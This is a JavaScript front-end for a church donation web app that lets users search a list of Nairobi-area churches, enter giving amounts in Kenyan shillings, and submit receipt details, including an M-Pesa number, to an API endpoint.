
// Sample church data for search functionality
const churches = [
    { name: "Zetech University", code: "ZETU001" },
    { name: "Nairobi Central Church", code: "NCC002" },
    { name: "Karen Adventist Church", code: "KAC003" },
    { name: "Eastleigh SDA Church", code: "ESC004" },
    { name: "Kibera Community Church", code: "KCC005" },
    { name: "Westlands Baptist Church", code: "WBC006" },
    { name: "Kasarani Methodist Church", code: "KMC007" },
    { name: "Thika Road Chapel", code: "TRC008" },
    { name: "Langata Presbyterian", code: "LPC009" },
    { name: "Kiambu Town Church", code: "KTC010" }
];

let currentScreen = 1;
let selectedChurch = '';
let donationData = {};

// Initialize the app
document.addEventListener('DOMContentLoaded', function() {
    loadStoredData();
    setupSearchFunctionality();
});

// Search functionality
function setupSearchFunctionality() {
    const searchInput = document.getElementById('church-search');
    const searchResults = document.getElementById('search-results');

    searchInput.addEventListener('input', function() {
        const query = this.value.toLowerCase();
        if (query.length < 2) {
            searchResults.style.display = 'none';
            return;
        }

        const filtered = churches.filter(church => 
            church.name.toLowerCase().includes(query) || 
            church.code.toLowerCase().includes(query)
        );

        if (filtered.length > 0) {
            searchResults.innerHTML = filtered.map(church => 
                `<div class="search-result" onclick="selectChurch('${church.name}')">${church.name}</div>`
            ).join('');
            searchResults.style.display = 'block';
        } else {
            searchResults.style.display = 'none';
        }
    });

    // Hide results when clicking outside
    document.addEventListener('click', function(e) {
        if (!e.target.closest('.search-container')) {
            searchResults.style.display = 'none';
        }
    });
}

function selectChurch(churchName) {
    selectedChurch = churchName;
    document.getElementById('church-search').value = churchName;
    document.getElementById('search-results').style.display = 'none';
    
    // Update church name in subsequent screens
    document.getElementById('selected-church').textContent = churchName;
    document.getElementById('receipt-church').textContent = churchName;
    document.getElementById('thankyou-church').textContent = churchName;
    
    // Automatically go to next screen after selection
    setTimeout(() => {
        goToScreen(2);
    }, 500);
}

function goToScreen(screenNumber) {
    // Hide current screen
    document.querySelector('.screen.active').classList.remove('active');
    
    // Show target screen
    document.getElementById(`screen-${screenNumber}`).classList.add('active');
    
    currentScreen = screenNumber;
    
    // Special handling for screen 3 (receipt)
    if (screenNumber === 3) {
        generateReceiptSummary();
    }
    
    // Store current screen
    storeData();
}

function generateReceiptSummary() {
    const form = document.getElementById('donation-form');
    const formData = new FormData(form);
    const summary = document.getElementById('receipt-summary');
    
    let total = 0;
    let summaryHTML = '';
    
    for (let [key, value] of formData.entries()) {
        if (value && value.trim() !== '') {
            const amount = parseFloat(value) || 0;
            total += amount;
            const displayName = key.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
            summaryHTML += `
                <div class="receipt-row">
                    <span>${displayName}</span>
                    <span>KES ${amount.toFixed(2)}</span>
                </div>
            `;
            donationData[key] = value;
        }
    }
    
    summaryHTML += `
        <div class="receipt-row">
            <span>Total</span>
            <span>KES ${total.toFixed(2)}</span>
        </div>
    `;
    
    summary.innerHTML = summaryHTML;
    donationData.total = total;
}

function toggleExpandable() {
    const content = document.getElementById('expandable-content');
    const icon = document.querySelector('.expand-icon');
    
    content.classList.toggle('expanded');
    icon.classList.toggle('rotated');
    icon.textContent = content.classList.contains('expanded') ? '−' : '+';
}

async function submitDonation() {
    const receiptForm = document.getElementById('receipt-form');
    const formData = new FormData(receiptForm);
    
    // Validate required fields
    let isValid = true;
    for (let [key, value] of formData.entries()) {
        if (!value.trim()) {
            isValid = false;
            break;
        }
    }
    
    if (!isValid) {
        alert('Please fill in all required fields');
        return;
    }
    
    // Prepare final data
    const finalData = {
        church: selectedChurch,
        donations: donationData,
        receipt_details: {
            full_name: formData.get('full_name'),
            church_member: formData.get('church_member'),
            mpesa_number: formData.get('mpesa_number')
        },
        timestamp: new Date().toISOString()
    };
    
    // Show loading state
    const submitBtn = event.target;
    const originalText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<div class="spinner"></div>';
    submitBtn.classList.add('loading');
    
    try {
        const response = await fetch('https://cyberdevs.tech/api/v1', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(finalData)
        });
        
        if (response.ok) {
            goToScreen(4);
            clearStoredData();
        } else {
            throw new Error('Submission failed');
        }
    } catch (error) {
        console.error('Error submitting donation:', error);
        alert('There was an error submitting your donation. Please try again.');
    } finally {
        submitBtn.innerHTML = originalText;
        submitBtn.classList.remove('loading');
    }
}

function startOver() {
    clearStoredData();
    currentScreen = 1;
    selectedChurch = '';
    donationData = {};
    
    // Reset forms
    document.getElementById('donation-form').reset();
    document.getElementById('receipt-form').reset();
    document.getElementById('church-search').value = '';
    
    // Go to first screen
    document.querySelector('.screen.active').classList.remove('active');
    document.getElementById('screen-1').classList.add('active');
}

function reportIssue() {
    alert('Issue reporting functionality would be implemented here. Please contact support at support@bahasha.com');
}

// Local storage functions
function storeData() {
    const data = {
        currentScreen,
        selectedChurch,
        donationData,
        timestamp: Date.now()
    };
    // Using a simple variable instead of localStorage as requested
    window.appData = data;
}

function loadStoredData() {
    const data = window.appData;
    if (data && (Date.now() - data.timestamp) < 3600000) { // 1 hour expiry
        currentScreen = data.currentScreen;
        selectedChurch = data.selectedChurch;
        donationData = data.donationData;
        
        if (selectedChurch) {
            document.getElementById('selected-church').textContent = selectedChurch;
            document.getElementById('receipt-church').textContent = selectedChurch;
            document.getElementById('thankyou-church').textContent = selectedChurch;
            document.getElementById('church-search').value = selectedChurch;
        }
        
        // Go to stored screen
        if (currentScreen !== 1) {
            document.querySelector('.screen.active').classList.remove('active');
            document.getElementById(`screen-${currentScreen}`).classList.add('active');
        }
    }
}

function clearStoredData() {
    window.appData = null;
    
}